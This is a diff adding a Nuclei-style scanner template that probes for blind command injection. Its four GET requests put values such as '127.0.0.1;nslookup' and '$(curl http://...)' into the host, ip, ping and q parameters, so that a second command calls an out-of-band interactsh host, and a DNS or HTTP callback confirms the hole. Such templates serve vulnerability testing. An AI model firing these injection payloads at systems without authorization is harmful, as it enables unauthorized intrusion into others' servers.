@@ -1,0 +1,23 @@
+id: m7-cmdi-oob
+info:
+  name: M7 - Blind CMDi via OOB DNS Callback
+  author: Sharlix
+  severity: critical
+  description: Blind command injection detected via DNS callback
+  tags: cmdi,oob,blind,m7hunter
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?host=127.0.0.1;nslookup {{interactsh-url}}"
+      - "{{BaseURL}}?ip=127.0.0.1|nslookup {{interactsh-url}}"
+      - "{{BaseURL}}?ping=127.0.0.1;curl http://{{interactsh-url}}"
+      - "{{BaseURL}}?q=127.0.0.1$(curl http://{{interactsh-url}})"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
